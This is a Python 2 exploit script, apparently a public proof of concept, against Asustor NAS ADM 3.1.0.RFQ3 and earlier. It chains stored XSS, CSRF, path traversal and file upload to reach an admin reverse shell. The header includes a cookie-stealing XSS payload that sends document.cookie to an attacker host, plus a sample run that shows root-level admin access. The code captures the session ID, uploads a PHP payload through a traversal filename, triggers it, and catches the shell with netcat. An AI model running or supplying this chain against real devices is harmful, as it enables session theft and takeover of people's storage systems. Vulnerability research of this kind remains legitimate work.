#!/usr/bin/python

'''
This exploit takes advantage of a persistent cross site scripting vulnerability within Asustor nas's using
ADM 3.1.0.RFQ3 and below (I haven't tested the current version yet). 
CVE requests: I believe are pending, however the vendor has had zero contact with me, and I decided it was
time to to drop this based a changelog that indicates they fixed bugs I reported. Nothing mind blowing
but a fun way to chain bugs:) 

The chain is essentially stored xss -> csrf -> path traversal -> unrestricted file upload, leading to
a adminsitrative shell 
Author: matthew fulton
date: april 26th 2018
My original idea was fetching a remote javascript Payload however they did appear to have some defences against that and this seemed quicker to prototype. 
XSS Payload to use on vulnerable parameters: <img%20src=x%20onerror=this.src='http://<AttackerIP:<PORT>/?c='%2Bdocument.cookie>

Came up with this late at night using Macosx, so may need a few tweaks os to os :)
Python 2.7.10
Just going to handle https here, but should be simple enough to modify if required, if anyone were to find this useful 
Sample run:
sh-3.2# python asustor.py -t 192.168.1.82
This python script takes advntage of several bugs in order to achieve code execution against
the asustor ADM 3.1.0.RFQ3 and below.
author: matthew fulton
date: april 26 2018
Starting up HTTP server to steal SID value
Sleeping a few seconds until requests generate
Creating request based on SID value, prior to sending

Trying to send post data
Payload uploaded to: http://192.168.1.82/bibas123.php
Creating URL fetch daemon
Start up listner
starting netcat listener on port 4444
python -c 'import pty;pty.spawn("/bin/sh")'  # <-- at this point you have a shell
/volume1/Web $ uname -a;id
uname -a;id
Linux AS6202T-961F 4.4.24 #1 SMP Mon Mar 26 02:57:14 CST 2018 x86_64 GNU/Linux
uid=999(admin) gid=999(administrators) groups=100(users),997(nvradmins),999(administrators)
'''

from SimpleHTTPServer import SimpleHTTPRequestHandler
from BaseHTTPServer import HTTPServer
import logging, re 
import sys, socket, threading, time, os
import urllib2
import ssl
import argparse

#setup option parsing 
Help = """Exploitation of several bugs outlined in post on company blog. This exploit will take advantage\
of several bugs within Asustor's NAS products in order to achieve remote code execution.\
This goes without saying, it will likely never be useful, for anyone:)\
author: matthew fulton
"""
parser=argparse.ArgumentParser(description=help)
parser.add_argument('--target', '-t', default="192.168.1.82", help="Target IP", required=True)
parser.add_argument('--port', '-p', default="8001")
parser.add_argument('--lfile', '-l', help="Full path to file to payload",default="payload.txt")
parser.add_argument('--rfile', '-r', help="Remote system file name", default="bibas123.php")
parser.add_argument('--tuser', '-u', help="Target user", default="tadmin")
args = parser.parse_args()
target = args.target
rport = args.port
localfile = args.lfile
remotefile = args.rfile
targetuser = args.tuser
#handling a specific user case here, will add parsing option fo
#url = "https://"+target+":"+rport+"/portal/apis/fileExplorer/upload.cgi?sid="+v+"&act=upload&overwrite=0&path=%2Fhome%2F"+tuser
#print url
#todo custom http server setup
PORT = 80

'''
Function purpose: to parse for a unique as_sid value that will be used lateron 
'''
def parseLog():
	f=open("logfile.txt","r")
	s = f.read()
	q = s.split(';')[1]
	result = re.search("as_sid=(.*)$",q)
	global v
	v = result.group(1)
	f.close()
	return v

'''
This function is def doing a lot more than it ought to. 
General idea: Start an simple http server instance, start logging of requests, call parselog function
If parselog function finds the as_sid value, terminate simplehttpserver
'''
def startHTTP():
	#start handler 
	server = HTTPServer(('', 80), SimpleHTTPRequestHandler)
	thread = threading.Thread(target = server.serve_forever)
	thread.daemon = True
	try:
		thread.start()
	except KeyboardInterrupt:
		server.shutdown()
		sys.exit(0)
	buffer = 192
	sys.stderr = open('logfile.txt', 'w', buffer)

'''
Creates and sends the request that will be uploaded using the sid obtained from the XSS
'''
def exploit():
	print "Creating request based on SID value, prior to sending\n"
	#url = "https://192.168.1.82:8001/portal/apis/fileExplorer/upload.cgi?sid="+v+"&act=upload&overwrite=0&path=%2Fhome%2Ftadmin"
	url = "https://"+target+":"+rport+"/portal/apis/fileExplorer/upload.cgi?sid="+v+"&act=upload&overwrite=0&path=%2Fhome%2F"+targetuser
	#open payload file for upload
	f = open(localfile,'r')
	fileContents = f.read()
	f.close()
	#set header information 
	http_header = {
		"Host" : "192.168.1.82:8001",
		"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
		"Accept" : "*/*",
		"Accept-Language" : "en-us,en;q=0.5",
		"Accept-Encoding" : "gzip, deflate",
		"Referer" : "https://"+target+":"+rport+"/portal/?5A843C45",
		"Content-Length": "325",
		"Content-type" : "multipart/form-data; boundary=---------------------------157376534518655569631154630941", 
		"DNT": "1",
		"Connection" : "close"
	}	
	
	# Build the payload data that will be sent
	data = '-----------------------------157376534518655569631154630941\r\n'
	data += 'Content-Disposition: form-data; name=\"file\"; filename=\"../../../volume1/Web/'+remotefile+'\"\r\n'
	data += 'Content-Type: application/octet-stream\r\n'
	data += '\r\n'+fileContents+'\r\n'
	data += '\r-----------------------------157376534518655569631154630941--\r\n'
	#Set up context to ignorse ssl issues
	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE
	req = urllib2.Request(url, data, http_header)
	#cheesy, but want the socket to timeout after and this should ensure that
	socket.setdefaulttimeout(5)
	#try to send POST data and say uhoh if it doesn't work
	try:
		print "Trying to send post data"
		res = urllib2.urlopen(req,context=ctx)
		res.close()
	except Exception:
		pass
	#res.close()

'''
For testing purposes just calling netcat via system, if i ever update this i'll add in a custom
listener
'''
def revShell():
	print "starting netcat listener on port 4444"
	os.system("nc -l 4444")

class openURL(object):
	def __init__(self,interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()
	def run(self):
		while True:
			turl="http://"+target+"/"+remotefile
			response=urllib2.urlopen(turl)
			time.sleep(self.interval)



if __name__ == '__main__':
	print "This python script takes advntage of several bugs in order to achieve code execution against"
	print "the asustor ADM 3.1.0.RFQ3 and below."
	print "likely this will never be useful for anyone :)"
	print "author: matthew fulton"
	print "date: april 26 2018"
	print "Starting up HTTP server to steal SID value"
	startHTTP()
	print "Sleeping a few seconds until requests generate"
	time.sleep(4)
	parseLog()
	exploit()
	print "Payload uploaded to: http://"+target+"/"+remotefile
	print "Creating URL fetch daemon"
	uopen = openURL()
	time.sleep(3)
	print "Start up listner"
	revShell()




